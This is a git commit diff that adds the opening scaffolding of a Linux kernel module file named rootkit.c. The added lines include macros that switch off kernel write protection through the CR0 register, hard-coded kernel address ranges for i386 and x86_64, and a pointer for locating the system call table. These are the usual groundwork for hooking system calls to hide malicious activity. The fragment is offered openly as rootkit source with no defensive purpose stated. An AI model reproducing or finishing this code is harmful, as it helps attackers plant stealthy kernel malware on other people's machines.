ce80c82e55431f61a5539794e5965988386a6428
krishpranav <krisna.pranav@gmail.com>
2021-03-11 08:51:18 +0530

    done changes

--- rootkit.c
+++ rootkit.c
@@ -53,3 +53,33 @@ struct proc_dir_entry {
 #include "config.h"
 
 #define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("krishpraanv")
+
+#define ARCH_ERROR_MESSAGE "Only i386 and x86_64 architectures are supported! " \
+		"It should be easy to port to new architectures though"
+
+
+#define DISABLE_W_PROTECTED_MEMORY \
+    do { \
+        preempt_disable(); \
+        write_cr0(read_cr0() & (~ 0x10000)); \
+    } while (0);
+#define ENABLE_W_PROTECTED_MEMORY \
+    do { \
+        preempt_enable(); \
+        write_cr0(read_cr0() | 0x10000); \
+    } while (0);
+
+#if defined __i386__
+	#define START_ADDRESS 0xc0000000
+	#define END_ADDRESS 0xd0000000
+#elif defined __x86_64__
+	#define START_ADDRESS 0xffffffff81000000
+	#define END_ADDRESS 0xffffffffa2000000
+#else
+	#error ARCH_ERROR_MESSAGE
+#endif
+
+void **sys_call_table;
